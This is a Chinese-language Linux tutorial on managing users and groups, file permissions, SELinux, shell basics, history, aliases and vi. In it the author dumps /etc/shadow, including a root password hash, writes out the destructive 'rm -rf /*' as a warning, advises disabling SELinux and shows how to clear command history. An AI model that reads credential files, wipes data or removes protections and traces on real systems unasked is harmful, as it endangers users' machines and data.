linux删除用户之后，/home/目录下对应的用户文件夹还在，如果还想加回来这个用户，那么会提示家目录存 在，不会从样板目录(skel)中复制任何文件了，通过ls -a /etc/skel，可以看到skel目录下的内容了。 还提示邮箱文件已经存在，ls /var/spool/mail下面 windows删除用户之后，c:\\Users目录下的用户文件夹也还在 注意：删除之后的用户，再次创建出来，密码是需要重新设置的[root@localhost ~]# userdel -r test1 # 删除用户，并删除用户相关目录 1-5 修改用户信息，修改属性#修改用户信息，修改属性usermod # modify 它有很多选项(参数)，-L是锁定用户，通过命令 -h(或者--help，一个-后面一般跟一个字母即可，两个-后面一般跟完整单词)，可以查看命令的各种选项的意思，比如usermod -h#锁定用户(和windows的禁用用户一个意思)例子1：[root@localhost ~]# usermod -L test1 #被锁定的用户，下次就登录不上系统了。[root@localhost ~]# usermod -U test1 #解锁用户[root@localhost ~]# lchage -l test1 # 查看用户详细信息帐号被锁。至少: 0至多: 99999警告: 7不活跃： 从不最后一次改变： 2021年07月20日密码过期： 从不密码不活跃： 从不帐号过期： 从不#禁止用户登录(这个后面再说)[root@localhost ~]# usermod -s /sbin/nologin test2[root@localhost ~]# grep -w test2 /etc/passwdtest2:x:1001:1001::/home/test2:/sbin/nologin 1-6 查看用户详细信息lchage例子1：[root@localhost ~]# lchage -l test1 帐号没被锁。 至少: 0 至多: 99999 警告: 7 不活跃： 从不 最后一次改变： 2021年07月20日 密码过期： 从不 密码不活跃： 从不 帐号过期： 从不 ## 所有的用户信息存储在/etc/passwd文件中，每创建一个用户该文件就会多一行记录## passwd文件解释root:x:0:0:root:/root:/bin/bashtest1:x:1000:1000::/home/test1:/bin/bashtest2:x:1001:1001::/home/test2:/sbin/nologintest3:x:1002:1000::/home/test3:/sbin/nologinhaha:x:1004:1004:putong user:/home/haha:/bin/bash第一列：用户名第二列：x第三列：uid # root用户的uid是0，我们自己创建的用户uid是1000及之后的数值。第四列：gid第五列：注释，一般为空第六列：家目录的位置第七列：使用shell的名称，默认使用/bin/bash## 有的用户密码信息存储/etc/shadow，设置了密码的长度比较长。密码是两层加密的，基本无法破解。但是如果黑客权限比较高，它可以用知道密码的shadow文件来替换这个文件，或者修改这个文件下某个用户的密码，只有root用户才有权力修改这个文件。[root@localhost ~]# cat /etc/shadowroot:$6$QM3AHtFflOvGbCnt$2wTYZrnO8c66vycaxprE79G.I7hiy8EqXntG86FXxqlSawjtKoTjAnAa9xFA3ad1QpFskJRPt0QeDPBnZZAdx0::0:99999:7:::bin:*:18353:0:99999:7:::daemon:*:18353:0:99999:7:::adm:*:18353:0:99999:7:::lp:*:18353:0:99999:7:::sync:*:18353:0:99999:7:::shutdown:*:18353:0:99999:7:::halt:*:18353:0:99999:7:::mail:*:18353:0:99999:7:::operator:*:18353:0:99999:7:::games:*:18353:0:99999:7:::ftp:*:18353:0:99999:7:::nobody:*:18353:0:99999:7:::systemd-network:!!:18827::::::dbus:!!:18827::::::polkitd:!!:18827:::::: 1-7 登录主机的两种方式：## 本地登录：直接在主机上输入用户名和密码登录## 远程登录：ssh远程登录## windows默认只能同时一个用户登录，登录另外一个用户，前一个用户就会自动下线。## linux支持多个用户在多个地方同时登录一个系统，每个用户都有一个终端来控制操作系统。终端的意思就是连接窗口。# 查看当前登录了几个用户，或者打开了几个终端w结果：下面表示2个终端登录了12:15:42 up 21 min, 2 users, load average: 0.00, 0.01, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty1 12:15 6.00s 0.00s 0.00s -bashroot pts/0 192.168.61.1 11:55 6.00s 0.02s 0.01s w# tty1表示本地登录的、pts/0表示远程登录的 2.7.2 用户组管理2-1 新建组和查看组:## 新建组和查看组: groupadd 组名例子： [root@localhost tmp]# groupadd test [root@localhost tmp]# cat /etc/group # 查看有哪些组 2-2 指定组来创建用户#指定组来创建用户，如果没有指定组，那么创建用户的时候，linux会自动创建一个与用户名同名的组。例子： 组的英文是group[root@localhost tmp]# useradd -g test1 test3 #-g 是指定主组[root@localhost tmp]# id test3uid=1002(test3) gid=1000(test1) 组=1000(test1)# gid表示用户的属组的主组# 组=表示用户的属组，用户可以属于多个组，一个主组，多个其他组。 2-3 删除组# 删除组groupdel 组名例子：[root@localhost tmp]# groupdel test #如果组内有用户，会报错，需要先删除主组属于这个组的所有用户(userdel -r 用户名)，或者将用户移到其他的组之后在删除组。# 修改组名# groupmod -n jaden wulaoban # 将wulaoban组名改为jaden 2-4 修改用户所属的主组# 修改用户所属的主组usermod -g 组名例子：[root@localhost tmp]# usermod -g test jaden #将jaden用户的主组改为test[root@localhost tmp]# groupdel jaden # 就可以将jaden组删除了。# 将用户添加到多个其他组中usermod -G[root@localhost tmp]# usermod -G test wulaoban # 将wulaoban用户也添加到test组 2.8 权限管理2.8.1 权限介绍和示例## root用户权限最高，所以一般对他不做什么权限设置。其他用户就要设定权限并且遵守权限了。文件权限：#文件属性[root@localhost ~]# ls -l /tmp/123.txt -rw-r--r--. 1 root root 0 7月 20 23:17 /tmp/123.txt #第一段的第一个字符，表示文件类型 -文件、d目录、l软链接(对应着windows快捷方式)、b块设备(ls /dev，可以看到硬盘sda等)#第一段第2-4字符，表示该文件所属用户的权限#第一段第5-7字符，表示该文件所属用户组的权限#第一段第8-10字符，表示其他用户对该文件的权限 r 4 代表读权限 read w 2 代表写权限 write x 1 代表可执行权限 executable - 0 空权限位，表示没有这个权限，9位权限不能少，没有的权限就用-代替。权限值表 0 --- 1 --x 2 -w- 3 -wx 4 r-- 5 r-x 6 rw- 7 rwxugo权限体系: rw- r-- r-- user group other ## root没办法玩昂，因为默认权限太高。我们用普通用户来玩：用xshell开启多个窗口连接上这三个用户。创建三个用户并设置密码：lisi、wangwu、zhaoliu[root@localhost ~]# useradd lisi[root@localhost ~]# passwd lisi 更改用户 lisi 的密码 。 新的 密码： 无效的密码： 密码少于 8 个字符 重新输入新的 密码： passwd：所有的身份验证令牌已经成功更新。 [root@localhost ~]# useradd wangwu[root@localhost ~]# passwd wangwu 更改用户 wangwu 的密码 。 新的 密码： 无效的密码： 密码少于 8 个字符 重新输入新的 密码： passwd：所有的身份验证令牌已经成功更新。 [root@localhost ~]# [root@localhost ~]# useradd zhaoliu[root@localhost ~]# passwd zhaoliu 更改用户 zhaoliu 的密码 。 新的 密码： 无效的密码： 密码少于 8 个字符 重新输入新的 密码： passwd：所有的身份验证令牌已经成功更新## 使用lisi来登录，并创建个文件，将文件权限全部去掉，修改权限用chmod指令，全称change mode：# 例如：chomd -r,就是去掉r权限，chomd +r就是加上读权限，chmod +wr就是加读写权限，chmod u+r，就是给文件属主用户添加读权限等 [lisi@localhost ~]$ touch 1.txt [lisi@localhost ~]$ vi 1.txt [lisi@localhost ~]$ ls -l 总用量 4 -rw-rw-r--. 1 lisi lisi 12 3月 20 09:07 1.txt [lisi@localhost ~]$ chmod -rw 1.txt [lisi@localhost ~]$ ls -l 总用量 4 ----------. 1 lisi lisi 12 3月 20 09:07 1.txt ## 现在这个文件是没有任何权限的，但是文件是lisi创建的，文件属主还是lisi，虽然显示lisi也没有权限，但是实际上lisi是可以修改文件权限的，其他用户(除了root)是没有权力修改这个文件权限的。读权限的作用： ## lisi用户： [lisi@localhost ~]$ chmod -rw 1.txt [lisi@localhost ~]$ ls -l 总用量 4 ----------. 1 lisi lisi 12 3月 20 09:07 1.txt [lisi@localhost ~]$ cat 1.txt cat: 1.txt: 权限不够 [lisi@localhost ~]$ chmod u+r 1.txt [lisi@localhost ~]$ ls -l 总用量 4 -r--------. 1 lisi lisi 12 3月 20 09:07 1.txt [lisi@localhost ~]$ cat 1.txt hello jaden1 ## 为了方便其他用户查看，我们先将1.txt放到/tmp目录下。 [lisi@localhost ~]$ mv 1.txt /tmp/ [lisi@localhost ~]$ ls /tmp/ 1.txt ## wangwu用户： [wangwu@localhost ~]$ cd /tmp/ [wangwu@localhost tmp]$ cat 1.txt cat: 1.txt: 权限不够 [wangwu@localhost tmp]$ chmod o+r 1.txt chmod: 更改1.txt 的权限: 不允许的操作 ## 切换到lisi：给o加上r权限，再看效果 [lisi@localhost ~]$ chmod o+r /tmp/1.txt [lisi@localhost ~]$ ls -l /tmp/ 总用量 8 -r-----r--. 1 lisi lisi 12 3月 20 09:07 1.txt ## 再切换到wangwu来查看文件内容： [wangwu@localhost tmp]$ cat 1.txt hello jaden# 写权限的作用：## 但是wangwu想编辑文件，也是没有权限的。可以vi打开，但是编辑之后不能保存。## 再切换到lisi，给o一个w权限，wangwu就可以编辑保存了。 [lisi@localhost ~]$ chmod o+w /tmp/1.txt [lisi@localhost ~]$ ls -l /tmp/ 总用量 8 -r-----rw-. 1 lisi lisi 12 3月 20 09:07 1.txtwangwu编辑保存一下，查看内容： [wangwu@localhost tmp]$ vi 1.txt [wangwu@localhost tmp]$ cat 1.txt hello jaden hello wangwu## 可执行权限的作用：这个需要我们创建一个命令文件才能看效果，我复制某个命令文件过来，谁复制过来的，这个文件的属主就是谁，如下. 代表当前目录.. 代表上一级目录## 切换到lisi用户来复制ls文件到/tmp目录下，并将执行权限去掉，去掉执行权限的文件显示位白色，有执行权限的显示为绿色。[lisi@localhost ~]$ cd /tmp/ [lisi@localhost tmp]$ cp /bin/ls . [lisi@localhost tmp]$ ls -l -r-----rw-. 1 lisi lisi 25 3月 20 09:24 1.txt -rwx------. 1 root root 836 3月 15 20:14 ks-script-ed2ODG -rwxr-xr-x. 1 lisi lisi 117608 3月 20 09:29 ls [lisi@localhost tmp]$ chmod -x ls [lisi@localhost tmp]$ ls -l -r-----rw-. 1 lisi lisi 25 3月 20 09:24 1.txt -rwx------. 1 root root 836 3月 15 20:14 ks-script-ed2ODG -rw-r--r--. 1 lisi lisi 117608 3月 20 09:29 ls ## 切换到wangwu来执行一下ls这个文件： 注意，不能直接ls，直接ls还是调用系统/bin/ls文件，需要写./ls才是使用当前目录下的ls文件，或者写这个文件的绝对路径/tmp/ls，或者将它放到某个特定目录下，就可以直接使用对应指令而不用管路径了，这个我在下面有补充说明。 [wangwu@localhost tmp]$ ./ls -bash: ./ls: 权限不够 [wangwu@localhost tmp]$ /tmp/ls -bash: /tmp/ls: 权限不够 2.8.2 可执行程序特殊目录说明## 通过echo $PATH可以看到，类似于windows的环境变量中的PATH。反式放到这个目录中的命令程序，我们可以在任意目录下通过这个命令程序名称来直接调用命令来执行：[lisi@localhost tmp]$ echo $PATH # 下面这几个就是环境变量路径存放位置/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/lisi/.local/bin:/home/lisi/bin lisi@localhost tmp]$ cp ./ls /home/lisi/bin/[lisi@localhost tmp]$ ls /home/lisi/bin/ ls[lisi@localhost tmp]$ mv /home/lisi/bin/ls /home/lisi/bin/xxx # 为了不和系统默认的ls冲突，我们改名为xxx[lisi@localhost tmp]$ ls /home/lisi/bin/ xxx[lisi@localhost tmp]$ xxx[lisi@localhost tmp]$ xxx # 命令可以在任意目录下直接执行1.txt ls 2.8.3 权限值权限值：r 4w 2x 1- 0权限值表0 ---1 --x2 -w-3 -wx4 r--5 r-x6 rw-7 rwx## 修改权限举例## 如果我们想将某个文件的：rwxr-xr-x权限改为--x-w-r--，如果按照前面我们chmod指定字母的形式来修改，就比较麻烦，直接使用权限对应的数字改就很方便：rwxr-xr-x 对应的值为：755--x-w-r-- 对应的值为：124[lisi@localhost tmp]$ chmod 124 1.txt[lisi@localhost tmp]$ ls -l---x-w-r--. 1 lisi lisi 25 3月 20 09:24 1.txt## 别人再问你，某个文件的权限是多少的时候，我们一般都是直接报数字值，比如它的权限是755#改变文件的权限，例如：chomd -r,就是去掉r权限，chomd +r就是加上读权限chmod例子1：#修改权限之前 [test1@localhost tmp]$ ls -l -rw-rw----. 1 test1 test1 8 7月 20 17:20 test1.txt\\ #修改权限 [test1@localhost tmp]$ chmod u+x test1.txt #修改权限之后 [test1@localhost tmp]$ ls -l -rwxrw----. 1 test1 test1 8 7月 20 17:20 test1.txt 例子2：## 同时修改多个权限 [test1@localhost tmp]$ chmod u-x,g-x,o+x test1.txt [test1@localhost tmp]$ ls -l -rw-rw---x. 1 test1 test1 8 7月 20 17:20 test1.txt 例子3：## 数字修改更方便 [test1@localhost tmp]$ chmod 777 test1.txt [test1@localhost tmp]$ ls -l -rwxrwxrwx. 1 test1 test1 8 7月 20 17:20 test1.txt 2.9 修改文件所属#修改文件的所属,普通用户是不能修改其他用户文件的所属的，需要root用户，所以先切换到root用户来操作chown 2.9.1 修改用户和用户组例子1## 修改所属用户和用户组，test2:test2，前面的test2表示用户，后面的test2是组 [root@localhost tmp]# chown test2:test2 ls [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7月 20 17:43 grep -rwxr-xr-x. 1 test2 test2 117608 7月 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7月 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7月 20 17:38 test1.txt # chown -R nginx:nginx .# 把当前文件夹所有文件及子文件都改成nginx用户和Nginx组的 2.9.2 修改所属用户# 修改所属用户 [root@localhost tmp]# chown test1 ls [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7月 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7月 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7月 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7月 20 17:38 test1.txt 2.9.3 修改目录权限和所属例子3：文件夹(目录权限)##用root用户创建一个文件夹，文件夹默认所属用户和组为root:root，那么普通用户是没全限制在这个目录中创建文件的。 [root@localhost ~]# cd /tmp/ [root@localhost tmp]# mkdir jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 root root 6 3月 20 11:36 jaden ## 普通用户，比如lisi想在里面创建文件： [lisi@localhost tmp]$ cd jaden/ [lisi@localhost jaden]$ touch 2.txt touch: 无法创建2.txt: 权限不够 ## 如何让lisi有创建文件的权限呢？创建文件的权限就是目录写权限 ## 首先要切换到root用户，然后用root用户修改目录权限，或者直接将目录的所属修改为lisi修改权限： [root@localhost tmp]# chmod o+w jaden [root@localhost tmp]# ls -l drwxr-xrwx. 2 root root 6 3月 20 11:36 jaden ## 切换到lisi，创建文件： [lisi@localhost jaden]$ touch 2.txt [lisi@localhost jaden]$ ls 2.txt ## 修改所属： [root@localhost tmp]# chmod o-w jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 root root 19 3月 20 11:39 jaden [root@localhost tmp]# chown lisi:lisi jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 lisi lisi 19 3月 20 11:39 jaden ## 切换到lisi： [lisi@localhost jaden]$ touch 3.txt [lisi@localhost jaden]$ ls 2.txt 3.txt ## lisi也可以修改目录的权限了，因为它完全属于的lisi： [lisi@localhost tmp]$ chmod o+w jaden [lisi@localhost tmp]$ ls -l drwxr-xrwx. 2 lisi lisi 32 3月 20 11:42 jaden 2.9.4 uid 和gid修改文件的所属用户和用户组#使用uid和gid修改文件的所属用户和所属用户组 属主，属组例子2： [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7月 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7月 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7月 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7月 20 17:38 test1.txt [root@localhost tmp]# id test1 uid=1000(test1) gid=1000(test1) 组=1000(test1) [root@localhost tmp]# id test2 uid=1001(test2) gid=1001(test2) 组=1001(test2) [root@localhost tmp]# useradd -g test1 test3 [root@localhost tmp]# id test3 uid=1002(test3) gid=1000(test1) 组=1000(test1) [root@localhost tmp]# chown 1001:1001 test1.txt [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7月 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7月 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7月 20 17:43 mv -rw-rw-rw-. 1 test2 test2 14 7月 20 17:38 test1.txt 2.9.5文件权限和目录权限的解释说明## 文件权限： rwx 读写执行## 目录的权限： ## rwx，r表示可以查看目录下有哪些文件 ## x表示可以cd切换到该目录 ## w表示可以在目录中创建、修改、删除文件等操作 ## 为了安全操作： ## 文件权限默认： 644权限、狠一点就给600权限 ## 目录权限默认： 755权限、狠一点就给700权限 2.10 文件属性详解2.10.1 文件属性#文件属性[root@localhost ~]# ls -l -rw-rw-rw-. 1 lisi lisi 0 3月 20 16:00 222.txt#第一段的第一个字符，表示文件类型 ## -文件、 ## d目录、 ## l软链接(对应着windows快捷方式)、 ## b块设备(ls /dev，可以看到硬盘sda等) #第一段第2-4字符，表示该文件所属用户的权限#第一段第5-7字符，表示该文件所属用户组的权限#第一段第8-10字符，表示其他用户对该文件的权限#第一段的第11个字符. ，表示开启selinux的状态下创建的，也证明selinux是开启状态的。# 看到.表示这个文件受到selinux的保护，selinux：https://baike.baidu.com/item/SELinux/8865268?fr=aladdin，这个东西很安全，但是有了它变得很麻烦，安全和便利一般是冲突的。主要是红帽系的系统(redhat\\centos\\阿里的龙蜥\\华为的欧拉)有这个机制。我们一般上来就是关闭它，安全方面我们通过其他方法来控制。查看selinux的指令： # 查看状态 [lisi@localhost tmp]$ sestatus SELinux status: enabled # enabled表示开启状态，disabled表示禁用状态 SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 # 关闭和开启selinux，需要root权限才能修改 [root@localhost tmp]# ls -l /etc/selinux/config -rw-r--r--. 1 root root 543 3月 15 20:11 /etc/selinux/config [root@localhost tmp]# vi /etc/selinux/config 把7行改为： SELINUX=disabled #然后保存退出，并且重启系统才会生效。 # 然后再登录创建文件，查看文件信息，就看不到.了 [root@localhost ~]# touch 1.txt [root@localhost ~]# ls -l -rw-r--r-- 1 root root 0 3月 20 13:32 1.txt #第二段的数字，表示该文件的硬链接数量，其实这个和我们的安全没有太大关系，运维人员需要学习，ln是创建硬链接的指令。我们不提了#第三段的字符串，表示该文件所属用户#第四段的字符串，表示该文件所属用户组#第五段的数字，表示该文件的大小，默认单位为B，如果想按照KB来显示，那么可以通过ls -lh指令来查看。h是human的意思，以人类可读的方式显示，会自动按照文件大小来设定显示单位。#第六段到倒数第二段，都是该文件的修改时间，只要改动了文件内容，这个时间就会自动变为修改文件时的时间。 #其实linux系统会记录三个时间： # 访问时间(access time) 文件被打开时自动变化这个时间 # 修改时间(modify time) 文件内容发生变化时自动改变这个时间，ls -l 显示的就是这个时间。 # 改变时间(change time) 文件属性发生变化时自动改变这个时间，文件大小也是文件的属性，所以修改文件内容导致大小变化的时候，这个时间也会自动改变。 2.10.2查看访问时间、创建时间、修改时间 #windows系统也会记录三个时间：访问时间、创建时间、修改时间 #linux下通过stat指令来查看： [root@localhost ~]# stat 1.txt 文件：1.txt 大小：0 块：0 IO 块：4096 普通空文件 设备：801h/2049d Inode：67108933 硬链接：1 权限：(0644/-rw-r--r--) Uid：( 0/ root) Gid：( 0/ root) 最近访问：2023-03-20 13:32:34.333042228 +0800 最近更改：2023-03-20 13:32:34.333042228 +0800 最近改动：2023-03-20 13:32:34.333042228 +0800 创建时间：- # 我们改一下文件权限，然后再看时间 [root@localhost ~]# chmod 777 1.txt [root@localhost ~]# stat 1.txt 文件：1.txt 大小：0 块：0 IO 块：4096 普通空文件 设备：801h/2049d Inode：67108933 硬链接：1 权限：(0777/-rwxrwxrwx) Uid：( 0/ root) Gid：( 0/ root) 最近访问：2023-03-20 13:32:34.333042228 +0800 最近更改：2023-03-20 13:32:34.333042228 +0800 最近改动：2023-03-20 13:56:43.005634151 +0800 # 改动时间变了 创建时间：-#最一段，该文件的名称 2.11 Linux Shell2.11.1 Shell的意思## Shell： 蛋壳的意思，是linux中比较重要的一个概念，所有的命令其实都称之为shell命令。看图解：shell就是内核的一个外壳，用户通过shell来控制内核进而驱动硬件做事情，这是它名字的由来。Linux下，没有shell的话，就不能控制这个计算机了，因为内核是用户不能直接控制的。 ## 我们使用的是哪个shell呢？ # 在/etc/passwd中就可以看到： wangwu:x:1002:1002::/home/wangwu:/bin/bash # 后面这个/bin/bash，就是我们目前使用的shell，后面我们还会更换其他shell来玩，后面再说。 chrony:x:998:996::/var/lib/chrony:/sbin/nologin # 如果指定的是/sbin/nologin这个shell的话，是没有办法登录系统的 ## shell会帮我们检测输入和输出的内容是否正确 # 随便输入点东西，一回车，shell就检测到你这个指令不对，报错给你看 [root@localhost ~]# asdf -bash: asdf: 未找到命令 2.11.2 优化ssh登录速度## 如果你发现你的xshell或者ssh指令连接linux系统的时候很慢，等好久才连接成功，那么就可以按照下面的方式优化一下，目前我们没有遇到，所以这个暂时就不提了。#修改配置文件，先备份[root@localhost ~]# cp /etc/ssh/sshd_config /tmp/[root@localhost ~]# vi /etc/ssh/sshd_config #直接输入:79回车 79 GSSAPIAuthentication no 115 UseDNS no输入:wq保存退出 #重启sshd服务[root@localhost ~]# systemctl restart sshd#如果修改失败，还原配置文件[root@localhost ~]# cp /tmp/sshd_config /etc/ssh/sshd_config[root@localhost ~]# systemctl restart sshd 2.11.3 shell提示符#root用户提示符[root@localhost ~]##普通用户test1的提示符[test1@localhost ~]$ #格式：[用户名@主机名 所在目录]## 1、用户名，这个没说啥说的# 2、主机名：localhost是主机名，windows电脑也有主机名：我的电脑--属性--高级系统设置--计算机名，同一个网络中如果有多台计算机的话，每个计算机都应该有个自己的名字，就是主机名。Linux主机默认叫做localhost，也是可以修改的 [root@localhost ~]# hostname jaden [root@localhost ~]# logout ## 退出之后，在重新登录，就看到主机名改好了，如下 [root@jaden ~]# hostname jaden # 3、所在目录：root登录之后，默认所在目录是/root，此时~表示的/root目录，如果是普通用户登录的，那么~表示的是用户家目录，cd切换目录的时候，显示的当前所在目录 # root用户： [root@jaden ~]# pwd /root # 普通用户： [zhangsan@jaden ~]$ pwd /home/zhangsan # 4、提示符号 # 代表当前登录的用户是管理员,$代表的是当前登录用户是普通用户 # 提示符格式定制，这个简单理解一下即可，一般都不改 # 原格式： [root@test ~]# echo $PS1 [\\u@\\h \\W]\\$ # \\u是用户，\\h是主机名，\\W是相对路径 # 临时修改：重新登录就又还原了 [root@test ~]#cd /usr/local/bin/ [root@test bin]#export PS1=[\\u@\\h \\w]\\$ # \\w表示绝对路径 [root@test /usr/local/bin]# #永久修改 [root@test 10:23:39 /usr/local/bin]#cd [root@test 10:24:25 ~]#vi .bashrc #找个空白的地方，插入一行 export PS1=[\\u@\\h \\t \\w]\\$ #linux PS1可以各种定制：参考https://www.cnblogs.com/Q--T/p/5394993.html 3-1 临时修改主机名#临时修改主机名 hostname 例子1： [root@localhost ~]# hostname test #需要重新登录生效 3-2 查看主机的信息hostnamectl#查看主机的信息 [root@localhost ~]# hostnamectl Static hostname: localhost.localdomain Icon name: computer-vm Chassis: vm Machine ID: f8a89169114741a8ac6de82954c5fbcb Boot ID: dcf65386ccda42e29699d56101af8cf1 Virtualization: vmware Operating System: CentOS Linux 7 (Core) CPE OS Name: cpe:/o:centos:centos:7 Kernel: Linux 3.10.0-1127.el7.x86_64 Architecture: x86-64 3-3 永久修改主机名#永久修改主机名 [root@localhost ~]# hostnamectl set-hostname test #需要重新登录生效 3-4 重启系统#重启系统 reboot 例子1： [root@test ~]# reboot 3-5 关闭或重启Linux#关闭或者重启linux shutdown #立即关机 [root@localhost ~]# shutdown -h now#5分钟之后关机，可以使用shutdown -c 取消 [root@localhost ~]# shutdown -h 5#5分钟之后重启系统，可以使用shutdown -c 取 2.11.4 shell基础语法4-1 不带参数## Linux的指令基本都是下面的语法结构，遇到什么指令都不用慌了。 ##不带参数的： ## reboot、pwd、id、ls等都可以不接参数，不多 4-2 带参数的## 带参数的： 命令 参数 目标 ls -a -l -h /opt # 参数还可以合并为-alh rm -rf /opt/test1 命令 源... 目标 mv 源路径 目标路径 cp 4-3 查看命令的参数# 查看命令的参数： 命令 -h或者--help [root@test 11:12:02 /opt]#mv --help 用法：mv [选项]... [-T] 源文件 目标文件 或：mv [选项]... 源文件... 目录 或：mv [选项]... -t 目录 源文件... 4-4 格式参数#格式解释 ## 格式1：不带参数的命令： ## reboot、pwd、id、ls等都可以不接参数，不多 ## 格式2：带参数一个参数的指令： ls -l usermod -h 或者 usermod --help ## 格式3：带多个参数的指令： ls -a -l -h # 参数还可以合并为-alh ## 格式4：带参数带一个目标的指令 ls -l /boot rm -rf /tmp/jaden # 注意：千万不要rm -rf /* 这是删除根目录的意思，或者 rm -rf /tmp/*,如果tmp目录不存在，也是删除根目录的意思。 ## 格式5：命令带一个目标 cd /tmp/ ls /tmp/ mkdir jaden useradd jaden ... ## 格式6：命令带多个源和目标 cp jaden.txt /tmp/11.txt # cp 源1 目标1 cp 1.txt 2.txt 3.txt /tmp # cp 源1 源2 源3 目标1 ## 格式7：命令带多个参数、多个源和多个目标 ls -a -l -h /tmp /root /opt cp -a -v /root /root2 # -v是显示拷贝过程的，-a 保留原文件属性的前提下复制文件 2.11.5 tab键补全## 补全命令： #如果预选的特别多 [root@test 11:25:24 ~]# Display all 1400 possibilities? (y or n) #如果预选少 [root@test 11:25:24 ~]#cha chacl chage chattr ## 补全路径： #如果预选的特别多 [root@test 11:25:24 ~]#cd /etc/ Display all 188 possibilities? (y or n) #如果预选少 [root@test 11:25:24 ~]#cd /usr/src/ debug/ kernels/ # 路径不存在的话就说明路径不存在 2.11.6 快捷键Ctrl + a #光标跳转至正在输入的命令行的首部Ctrl + e #光标跳转至正在输入的命令行的尾部Ctrl + c #终止前台运行的程序，比如ping指令Ctrl + d #在shell中，ctrl-d表示推出当前shell。Ctrl + z #将任务暂停，挂至后台, 执行fg命令继续运行Ctrl + l #清屏，和clear命令等效。Ctrl + k #删除从光标到行末的所有字符Ctrl + u #删除从光标到行首的所有字符Ctrl + r #搜索历史命令, 利用关键字搜索ctrl + w #光标往前删除一个参数，以空格为分割。 2.11.7 history历史命令#历史 history [root@test 14:32:10 ~]#history 1 exit 2 ls 3 head -1 test03.txt 4 head -1 test03.txt|cat 5 head -1 test03.txt|tac 6 head -2 test03.txt|tac 7 head -2 test03.txt|cat 8 ip addr 9 ip addr|tail -4 10 ip addr|tail -4|head -1 ......#使用!调用历史命令 [root@test 14:32:10 ~]#history|head -5 1 exit 2 ls 3 head -1 test03.txt 4 head -1 test03.txt|cat 5 head -1 test03.txt|tac [root@test 14:32:26 ~]# !3 head -1 test03.txt head: 无法打开test03.txt 读取数据: 没有那个文件或目录 #使用!调用mv开头的命令 [root@test 14:42:17 ~]#history 1 ls -a -l .bash_history 2 history 3 ls 4 history 5 mv aaaaa.txt /tmp/ 6 history [root@test 14:42:19 ~]#!mv # 按回车，会自动找最近一次执行的mv开头的指令 mv aaaaa.txt /tmp/ mv: 无法获取aaaaa.txt 的文件状态(stat): 没有那个文件或目录#清除历史记录 history -c # 这是清除内存中的历史指令 ## 删除主文件夹下面.bash_history # 这是清除硬盘中的历史指令，内存中的指令会自动备份到.bash_history中，但是有个延迟，退出登录之后，才会将历史指令同步到硬盘文件中 ##每个用户家目录下都有一个.bash_history，记录的是自己用户的历史指令。 ## .bash_history默认记录最近的1000条指令，通过echo $HISTSIZE可以查看，可以配置的更大或者更小一些，vi /etc/profile，这 个以后再说。 2.11.8 命令别名(花名)#别名 alias # 比如：ls -l 直接可以写ll即可# 查看别名 [root@test 15:23:17 ~]#alias alias cp=cp -i alias egrep=egrep --color=auto alias fgrep=fgrep --color=auto alias grep=grep --color=auto alias l.=ls -d .* --color=auto alias ll=ls -l --color=auto alias ls=ls --color=auto alias mv=mv -i alias rm=rm -i# 添加别名 [test1@test 15:24:23 ~]$alias rm=rm -i # -i是提示警告信息用的 [test1@test 15:27:08 ~]$alias |grep rm alias rm=rm -i 或者：[test1@test 15:24:23 ~]$alias rm=echo 禁止使用删除操作# 取消别名 [test1@test 15:27:13 ~]$unalias ls [test1@test 15:27:47 ~]$alias |grep ls ##alias别名的优先级高于系统命令 ##别名一定要是可执行的，不能随便定义别名，比如jaden=aaaaaaa，执行jaden会报错，没有aaaaaaa这个指令#alias永久生效 [root@localhost ~]# vi .bashrc #空白处，增加一行alias cip=ip addr|tail -4|head -1 2.12 Linux输入输出重定向2.12.1 VI编辑器1-1 移动光标## 左，下，上，右，如果键盘上没有上下左右键，可以h,j,k,l ## 进入编辑模式有三个按钮：i、a、o， i在光标位置编辑、a是在光标后一位编辑、o是换行编辑，新起一行 ctrl+f 下翻一页 ctrl+b 上翻一页 ctrl+u 上翻半页 ctrl+d 下翻半页## 0 跳至行首，不管有无缩进，就是跳到第0个字符## ^ 跳至行首的第一个字符## $ 跳至行尾(shift+4)## gg 跳至文首## G 跳至文尾(shift+g)## 5gg/5G 调至第5行，或者命令行模式:5回车，也是跳到第5行，所以其实操作命令都不是唯一的 1-2 删除复制## x删除单个字符## 10x删除10个字符## dd 删除光标所在行(其实dd是剪切的操作), ## 使用u撤销之前的操作，使用ctrl+r恢复## 6dd 从光标开始往下删除6行## dw 删除一个单词(word)## 小p 粘贴粘贴板的内容到当前行的下面，比如将dd剪切的行黏贴到下面## 大P 粘贴粘贴板的内容到当前行的上面## yy 复制行## 5yy复制5行，复制的内容可以通过p\\P来黏贴 1-3 搜索和替换## 搜索： /pattern 向后搜索字符串pattern #辅助小n向下和大N向上，一般都是用/来搜索 ?pattern 向前搜索字符串pattern #辅助小n向上和大N向下，?搜索用的少## 替换： :1369s/shell/jaden/g # 将第1369行的shell替换为jaden，/还可以用#或者@符号来代替：:1369s#shell#jaden#g :1369,1379s/shell/jaden/g # 将1369至1379这10行中的shell替换为jaden :1369,$s/shell/jaden/g # 将1369至文末中的shell替换为jaden :%s/old/new/g #搜索整个文件，将所有的old替换为new :%s/old/new/gc 